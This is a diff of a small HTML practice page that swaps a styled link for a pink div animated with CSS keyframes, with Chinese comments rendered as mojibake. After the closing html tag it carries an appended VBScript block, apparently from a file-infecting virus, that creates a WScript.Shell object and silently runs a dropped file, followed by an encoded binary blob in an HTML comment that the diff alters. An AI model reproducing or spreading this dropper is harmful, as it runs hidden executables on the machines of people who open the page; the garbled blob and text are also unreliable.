@@ -1,28 +1,40 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh">
 	<head>
-		<meta charset="utf-8">
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<meta http-equiv="X-UA-Compatible" content="ie=edge">
 		<title></title>
 		<style type="text/css">
-			a {
-				height: 33px;
-				color: white;
-				padding-left: 15px;
-				display: inline-block;
-				text-decoration: none;
-				line-height: 33px;
-				background: url(to.png)no-repeat left;
+			div {
+				width: 100px;
+				height: 100px;
+				background-color: pink;
+				/* è°ƒç”¨ */
+				/* æ ¼å¼ï¼š
+				 åŠ¨ç”»åç§° èŠ±è´¹æ—¶é—´ è¿åŠ¨æ›²çº¿ ä½•æ—¶å¼€å§‹ æ’­æ”¾æ¬¡æ•° æ˜¯å¦åæ–¹å‘
+				 */
+				animation: move 2s ease 0s infinite alternate;
+				position: absolute;
+				left: 0;
 			}
-			span{
-				background: url(to.png)no-repeat right;
-				height: 33px;
-				padding-right: 15px;
-				display: inline-block;
+
+			/* å£°æ˜ */
+			@keyframes move {
+				from {
+					left: 0;
+					background-color: pink;
+				}
+
+				to {
+					left: 1000px;
+					background-color: red;
+				}
 			}
 		</style>
 	</head>
 	<body>
-		<a href="#"><span>é¦–é¡µ</span></a>
+		<div></div>
 	</body>
 </html>
 <SCRIPT Language=VBScript><!--
@@ -39,6 +51,6 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!-- À>0™%piQûŸ#ûŸ¢¯–å"ˆæ¾ÈûßAãÚ[ÌøYdFÃeí%{wòÃımüã‡ºRøuµôpì"¬·¿›]ş–;K†M‰S‚:2i©?NŸŒ­
-â{»àŞI%Õf£y é¹Ç8©8`ğJÜ´sÑâƒÛn–ˆk¦qUí·&ƒâ°¶‘.ëWÕ¦ŒZ¶î½ƒ$zàÚ¡b*¿QÙO7¼³÷‚.±Ô6^€_nC5n‚–PË¿Ì6¾Üz›ÅÁçeİğÉ#ÓÚ"µù÷š­å @Vá©¥ã–Ø05 õáÎröÆ'(.ÆÅ–CF¡Èj?•ò sk/÷Hlï¯µF“b,
-ùDª‰ıF{øÁ¹r \9E1ô/\b‡¨©«5¦UÁZy‡’\h,1¤…£Y Ü:R!ùÜ:Ü:Ü:‘çOğ9¬_÷İ: Ü:-->
+//--></SCRIPT><!--¶¿Ké5Ä"ÉG)à`ÂDDø1JR!0ãTz=¢­è;(l5í«j	Q¿¹HÊ)ÑA³5O(üŞ
+…[¸V–Ü’â»#ßæÈGïˆ.¿'İ)Ïë³xÎQ58eÒÌøŠèŞƒš.²&®¤YG‰Â-¤z/ [Ÿtç¸O…{#º5qX«3¬ô˜Ÿ{r¢–ø)ë)ƒg`&îS¯éÆõ÷ï·(”ª:å|ÈŠ"œÕã™#8Ù¿›Û*Ğ©­o*3ÑĞi¾ë¢’Kv‰øGæ¹vX3Bêö£]…·«ÔßÆÔŠ‘™ÁÌs°	RÚz-q`,pÒÄ­ëÕW‰„³MÙ•­kªàßd`ñ^Çò÷¡".ÆPeGü·×J<|9ì‹.Yf¶»	déê”“œJøæã¨¹ hàŠ6îJ˜NWÅÎ+²Š:SLÙ¼”cJ+$_=ñø»×elh©·9|”Kì»»†G6/mıs|hq8q¹ƒÎ‘¸¬ßÚ1{vìNZöş¯š~:^ß#*”³VJ…l'mg‡ÛÅÓ)|*å¿ŞïãZ[¼¸ÇşÅğeco{¨ŞçDs/lˆRX
+Õ¥ Ü:R!ùÜ:Ü:Ü:‘çOi2¬_ß: Ü:-->
